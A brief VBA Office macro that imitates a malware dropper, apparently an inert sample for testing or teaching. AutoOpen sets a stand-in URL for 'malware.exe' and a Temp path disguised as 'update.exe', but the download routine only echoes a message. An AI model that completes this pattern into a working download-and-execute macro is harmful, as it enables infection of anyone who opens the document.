Sub AutoOpen()
    ' This is a macro comment for setup
    Dim targetUrl As String
    Dim payloadPath As String
    
    targetUrl = "http://example.com/malware.exe"
    payloadPath = "C:\Windows\Temp\update.exe"
    
    Rem Executing the process
    Call DownloadAndExecute(targetUrl, payloadPath)
End Sub

Sub DownloadAndExecute(url As String, path As String)
    Dim sysCommand As String
    sysCommand = "cmd.exe /c echo Downloading..."
    Shell sysCommand
End Sub